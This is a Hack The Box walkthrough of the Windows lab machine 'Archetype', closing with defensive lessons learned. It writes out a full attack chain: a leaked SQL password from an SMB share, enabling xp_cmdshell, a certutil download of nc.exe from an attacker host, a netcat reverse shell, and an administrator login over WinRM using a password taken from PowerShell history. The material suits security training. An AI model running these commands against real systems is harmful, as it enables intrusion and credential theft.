---
title: "Archetype — Hack The Box Walkthrough"
description: "Footholding Archetype through SMB credential leak and MSSQL xp_cmdshell, then escalating via PowerShell history."
date: 2026-09-02
category: offensive
readTime: "6 min read"
mitre:
  - "T1190"
  - "T1078"
  - "T1068"
tags:
  - "Hack The Box"
  - "MSSQL"
  - "SMB"
  - "WinRM"
  - "Windows"
  - "CTF"
summary: "Footholding Archetype through SMB credential leak and MSSQL xp_cmdshell, then escalating via PowerShell history."
---

**Machine:** Archetype
**Difficulty:** Easy
**Key Techniques:** SMB enumeration, MSSQL xp_cmdshell, WinRM, PowerShell history privesc

---

## Enumeration

### Port Scanning

```
135/tcp   msrpc         Microsoft Windows RPC
139/tcp   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   microsoft-ds
1433/tcp  ms-sql-s      Microsoft SQL Server 2017 RTM
5985/tcp  wsman         WinRM
```

The host **Archetype** is a Windows Server 2019 (10.0.17763) machine with SMB and an exposed SQL Server on port 1433.

### SMB Credential Leak

```bash
smbclient -L //10.129.74.39
```

An anonymous SMB share is readable and contains a `prod.dtsConfig` file leaking **SQL Server credentials**:

```
Password= M3g4c0rp123
```

---

## Exploitation

### MSSQL xp_cmdshell

Connect to SQL Server with Impacket:

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.74.39 -windows-auth
```

Enable and use `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell whoami
```

Stage a reverse shell:

```sql
xp_cmdshell "certutil -urlcache -f http://<your-ip>/nc.exe C:\Windows\Temp\nc.exe"
xp_cmdshell "C:\Windows\Temp\nc.exe <your-ip> 4444 -e cmd.exe"
```

Shell as `sql_svc`.

### PowerShell History Privesc

Read the PowerShell history file for `sql_svc`:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It contains the **administrator password** in plaintext from a past session.

---

## Privilege Escalation

Login as administrator over WinRM:

```bash
evil-winrm -i 10.129.74.39 -u administrator -p <password>
```

```
user.txt: <flag>
root.txt: <flag>
```

---

## Lessons Learned

1. **Never store service credentials in world-readable SMB shares.** The `.dtsConfig` file leaked the SQL Service password.
2. **Enable `xp_cmdshell` only when necessary and restrict it** — it grants remote command execution on the host.
3. **PowerShell history retains plaintext passwords** — scrub sensitive commands or disable history persistence.
4. **Use dedicated low-privilege WinRM accounts**, not the built-in Administrator.
